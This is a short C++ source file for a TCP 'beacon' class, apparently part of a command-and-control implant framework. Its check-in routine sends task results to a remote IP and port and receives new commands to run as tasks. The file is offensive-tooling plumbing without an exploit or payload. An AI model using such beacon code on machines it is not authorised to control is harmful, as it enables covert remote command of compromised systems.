#include "BeaconTcp.hpp"

using namespace std;
using namespace SocketHandler;


BeaconTcp::BeaconTcp(std::string& ip, int port)
	: Beacon(ip, port)
{
	m_client=new Client(m_ip, m_port);
}


BeaconTcp::~BeaconTcp()
{
}


void BeaconTcp::checkIn()
{	
	std::string output;
	taskResultsToCmd(output);

	DEBUG("sending output.size " << std::to_string(output.size()));

	m_client->sendData(output);

	DEBUG("sent");

	DEBUG("receiving");

	string input;
	m_client->receive(input);

	DEBUG("received input.size " << std::to_string(input.size()));

	if(!input.empty())
	{
		cmdToTasks(input);
	}
}

